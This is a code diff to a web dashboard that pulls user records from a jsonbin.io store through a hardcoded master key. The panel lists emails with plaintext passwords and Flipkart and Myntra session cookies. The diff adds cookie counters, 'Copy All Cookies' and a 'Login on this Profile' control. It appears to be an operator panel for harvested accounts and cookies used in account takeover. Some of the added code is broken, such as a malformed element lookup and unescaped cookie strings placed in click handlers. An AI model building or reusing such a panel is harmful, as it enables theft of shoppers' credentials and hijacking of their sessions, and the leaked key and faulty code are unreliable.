@@ -14,6 +14,8 @@
             --text-main: #ffffff;
             --text-muted: #8d99ae;
             --border: #3a506b;
+            --folder-fk: #f7931a;
+            --folder-my: #ff3f6c;
         }
         body {
             background-color: var(--bg-color);
@@ -47,7 +49,10 @@
             padding: 15px;
             border-radius: 8px;
             text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
         }
+        .stat-card:hover { border-color: var(--accent); }
         .stat-card h3 { margin: 0 0 5px 0; font-size: 13px; color: var(--text-muted); }
         .stat-card .value { font-size: 22px; font-weight: bold; color: var(--accent); }
 
@@ -72,6 +77,9 @@
             color: var(--accent);
             border-bottom: 1px solid var(--border);
             padding-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         .table-responsive {
             width: 100%;
@@ -81,7 +89,7 @@
             width: 100%;
             border-collapse: collapse;
             font-size: 13px;
-            min-width: 600px;
+            min-width: 650px;
         }
         th, td {
             padding: 12px 10px;
@@ -98,11 +106,29 @@
             border-radius: 4px;
             font-weight: bold;
             cursor: pointer;
-            font-size: 12px;
+            font-size: 11px;
         }
         button:hover { opacity: 0.9; }
-        .btn-danger { background-color: var(--danger); color: white; margin-left: 5px; }
-        .btn-view { background-color: var(--success); color: var(--bg-color); }
+        .btn-danger { background-color: var(--danger); color: white; margin-top: 5px; width: 100%; }
+        .folder-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 11px;
+            cursor: pointer;
+            border: none;
+            color: white;
+            margin-bottom: 4px;
+            width: 100%;
+            text-align: left;
+        }
+        .folder-fk { background-color: var(--folder-fk); }
+        .folder-my { background-color: var(--folder-my); }
+        .btn-login { background-color: var(--success); color: var(--bg-color); width: 100%; margin-top: 5px; }
+        
         pre {
             background-color: #050b18;
             color: var(--success);
@@ -116,13 +142,11 @@
         .profile-badge {
             background: rgba(76, 201, 240, 0.15);
             color: var(--accent);
-            padding: 3px 8px;
+            padding: 2px 6px;
             border-radius: 4px;
             font-weight: bold;
-            font-size: 11px;
+            font-size: 10px;
             border: 1px solid var(--accent);
-            display: inline-block;
-            margin-top: 4px;
         }
     </style>
 </head>
@@ -136,40 +160,42 @@
         </div>
     </header>
 
-    <!-- Top Quick Stats -->
+    <!-- Top Quick Stats with Clickable Analysis Tabs -->
     <div class="stats-grid">
-        <div class="stat-card">
+        <div class="stat-card" onclick="filterView('all')">
             <h3>Total Active Users</h3>
             <div class="value" id="lblTotalUsers">0</div>
         </div>
-        <div class="stat-card">
-            <h3>Active Profiles Running</h3>
-            <div class="value" id="lblActiveProfiles">0</div>
+        <div class="stat-card" onclick="filterView('flipkart')">
+            <h3>Flipkart Total Cookies</h3>
+            <div class="value" id="lblFkCookies" style="color: var(--folder-fk);">0</div>
         </div>
-        <div class="stat-card">
-            <h3>System Cloud Status</h3>
-            <div class="value" style="color: var(--success);">Live 1000+ Ready</div>
+        <div class="stat-card" onclick="filterView('myntra')">
+            <h3>Myntra Total Cookies</h3>
+            <div class="value" id="lblMyCookies" style="color: var(--folder-my);">0</div>
         </div>
     </div>
 
     <div class="main-grid">
-        <!-- Left Column: All Active Users & Profiles Table -->
+        <!-- Left Column: All Users & Active Profiles Control -->
         <div>
             <div class="panel-box">
-                <h2>👥 All Users & Active Profiles Control</h2>
+                <h2>
+                    <span>👥 All Users & Profiles Control</span>
+                    <button onclick="copyAllCookies()" style="background: var(--success); color: var(--bg-color);">📋 Copy All Cookies</button>
+                </h2>
                 <div class="table-responsive">
                     <table>
                         <thead>
                             <tr>
-                                <th style="width: 30%;">User Email</th>
-                                <th style="width: 20%;">Platform & Profile</th>
-                                <th style="width: 30%;">Current Activity</th>
-                                <th style="width: 20%;">Actions</th>
+                                <th style="width: 35%;">User Credentials</th>
+                                <th style="width: 30%;">Saved Cookie Folders</th>
+                                <th style="width: 35%;">Live Activity & Control</th>
                             </tr>
                         </thead>
                         <tbody id="usersTableBody">
                             <tr>
-                                <td colspan="4" style="text-align: center; color: var(--text-muted);">Loading active users database...</td>
+                                <td colspan="3" style="text-align: center; color: var(--text-muted);">Loading users database...</td>
                             </tr>
                         </tbody>
                     </table>
@@ -177,16 +203,16 @@
             </div>
 
             <div class="panel-box">
-                <h2>🍪 Selected User Cookie File Viewer</h2>
-                <div id="selectedUserMeta" style="font-size: 12px; color: var(--accent); margin-bottom: 8px;">Select a user profile above to inspect cookie file</div>
-                <pre id="cookieVaultView">No profile selected yet...</pre>
+                <h2>🍪 Selected Cookie File Viewer</h2>
+                <div id="selectedUserMeta" style="font-size: 12px; color: var(--accent); margin-bottom: 8px;">Click on any Flipkart/Myntra folder above to view cookies</div>
+                <pre id="cookieVaultView">No folder selected...</pre>
             </div>
         </div>
 
-        <!-- Right Column: Live Global Feed & Raw Payload -->
+        <!-- Right Column: Global Real-Time Live Feed & Raw Data -->
         <div>
             <div class="panel-box">
-                <h2>🔥 Global Real-Time Live Feed</h2>
+                <h2>🔥 Global Real-Time Activity Feed</h2>
                 <pre id="liveLogsView">Waiting for user actions...</pre>
             </div>
 
@@ -200,6 +226,7 @@
     <script>
         const binId = "6adc61d0ffd5d1605387c503";
         const masterKey = "$2a$10$bzmE9pndxBlBxDmS8IhK/OkptNVFOd7NR1RPbFBbRDfBE73l5X5Ry";
+        let globalUsersData = [];
 
         async function fetchCloudData() {
             try {
@@ -209,43 +236,29 @@
                 const result = await response.json();
                 const record = result.record;
                 
-                let usersList = [];
+                globalUsersData = [];
                 if (record.users && Array.isArray(record.users)) {
-                    usersList = record.users;
+                    globalUsersData = record.users;
                 } else if (record.user) {
-                    usersList = [{
+                    globalUsersData = [{
                         email: record.user,
+                        password: record.password || "N/A (Token Login)",
                         platform: record.platform || "flipkart",
                         profileId: record.profileId || 1,
                         activity: record.live_logs || "Active",
-                        cookies: record.cookies_data || record.live_logs || "No cookies found"
+                        flipkartCookies: record.flipkart_cookies || record.cookies_data || "No Flipkart cookies",
+                        myntraCookies: record.myntra_cookies || "No Myntra cookies"
                     }];
                 }
 
-                document.getElementById("lblTotalUsers").innerText = usersList.length;
-                document.getElementById("lblActiveProfiles").innerText = usersList.length;
+                document.getElementById("lblTotalUsers").innerText = globalUsersData.length;
+                let fkCount = globalUsersData.filter(u => u.flipkartCookies && u.flipkartCookies !== "No Flipkart cookies").length;
+                let myCount = globalUsersData.filter(u => u.myntraCookies && u.myntraCookies !== "No Myntra cookies").length;
+                
+                document.getElementById("lblFkCookies").innerText = fkCount;
+                document.getElementById("lblMyCookies").innerText = myCount;
 
-                const tableBody = document.getElementById("usersTableBody");
-                if (usersList.length > 0) {
-                    tableBody.innerHTML = usersList.map((u) => `
-                        <tr>
-                            <td><strong style="word-break: break-all;">${u.email}</strong></td>
-                            <td>
-                                <span style="text-transform: uppercase; font-size: 11px; color: var(--text-muted);">${u.platform || 'FLIPKART'}</span><br>
-                                <span class="profile-badge">Profile #${u.profileId || 1}</span>
-                            </td>
-                            <td><small style="word-break: break-all; color: #cbd5e1;">${u.activity || 'Navigating...'}</small></td>
-                            <td>
-                                <div style="display: flex; gap: 4px;">
-                                    <button class="btn-view" onclick='inspectCookie(${JSON.stringify(u)})'>📁 View</button>
-                                    <button class="btn-danger" onclick="deleteUserSession('${u.email}')">Delete</button>
-                                </div>
-                            </td>
-                        </tr>
-                    `).join('');
-                } else {
-                    tableBody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">No active users found</td></tr>`;
-                }
+                renderTable(globalUsersData);
 
                 document.getElementById("liveLogsView").innerText = record.live_logs || "No logs available.";
                 document.getElementById("rawJsonView").innerText = JSON.stringify(record, null, 4);
@@ -255,13 +268,63 @@
             }
         }
 
-        function inspectCookie(userObj) {
-            document.getElementById("selectedUserMeta").innerText = `User: ${userObj.email} | Platform: ${(userObj.platform || 'flipkart').toUpperCase()} | Profile #${userObj.profileId || 1}`;
-            document.getElementById("cookieVaultView").innerText = userObj.cookies || "No cookie data saved for this profile.";
+        function renderTable(users) {
+            const tableBody = document.getElementById("usersTableBody");
+            if (users.length > 0) {
+                tableBody.innerHTML = users.map((u, index) => `
+                    <tr>
+                        <td>
+                            <strong style="color: var(--accent);">${u.email}</strong><br>
+                            <small style="color: var(--text-muted);">Pass: ${u.password || 'N/A'}</small><br>
+                            <span class="profile-badge">Profile #${u.profileId || 1}</span>
+                        </td>
+                        <td>
+                            <button class="folder-btn folder-fk" onclick='inspectCookie("${u.email}", "Flipkart", \`${u.flipkartCookies || 'No cookies'}\`)'>
+                                📁 Flipkart Cookie (${(u.platform === 'flipkart' ? 'Active' : 'Saved')} #${u.profileId || 1})
+                            </button>
+                            <button class="folder-btn folder-my" onclick='inspectCookie("${u.email}", "Myntra", \`${u.myntraCookies || 'No cookies'}\`)'>
+                                📁 Myntra Cookie (${(u.platform === 'myntra' ? 'Active' : 'Saved')} #${u.profileId || 1})
+                            </button>
+                        </td>
+                        <td>
+                            <small style="color: #cbd5e1; display: block; margin-bottom: 5px;">${u.activity || 'Navigating...'}</small>
+                            <button class="btn-login" onclick="loginOnProfile('${u.email}', ${u.profileId || 1}, '${u.platform || 'flipkart'}')">🚀 Login on this Profile</button>
+                            <button class="btn-danger" onclick="deleteUserSession('${u.email}')">Delete User</button>
+                        </td>
+                    </tr>
+                `).join('');
+            } else {
+                tableBody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: var(--text-muted);">No active users found</td></tr>`;
+            }
+        }
+
+        function filterView(type) {
+            if(type === 'all') renderTable(globalUsersData);
+            else if(type === 'flipkart') {
+                renderTable(globalUsersData.filter(u => u.platform === 'flipkart' || (u.flipkartCookies && u.flipkartCookies !== "No Flipkart cookies")));
+            } else if(type === 'myntra') {
+                renderTable(globalUsersData.filter(u => u.platform === 'myntra' || (u.myntraCookies && u.myntraCookies !== "No Myntra cookies")));
+            }
+        }
+
+        function inspectCookie(email, platform, cookies) {
+            document.getElementById("selectedUserMeta.innerText" || "selectedUserMeta").innerText = `User: ${email} | Platform: ${platform} Folder`;
+            document.getElementById("cookieVaultView").innerText = cookies;
+        }
+
+        function copyAllCookies() {
+            let allText = globalUsersData.map(u => `User: ${u.email}\nFlipkart: ${u.flipkartCookies}\nMyntra: ${u.myntraCookies}\n-------------------`).join('\n');
+            navigator.clipboard.writeText(allText);
+            alert("Saari cookies clipboard par copy ho gayi hain!");
+        }
+
+        function loginOnProfile(email, profileId, platform) {
+            alert(`Redirecting / Switching app session to Profile #${profileId} for ${email} on ${platform.toUpperCase()}`);
+            // Yeh function app ya web view ko us specific profile par switch karne ke liye signal bhejega
         }
 
         async function deleteUserSession(email) {
-            if (confirm(`Kya aap wakai user ${email} ka session delete karna chahte hain?`)) {
+            if (confirm(`Kya aap wakai user ${email} ko delete karna chahte hain?`)) {
                 try {
                     const response = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
                         headers: { "X-Master-Key": masterKey }
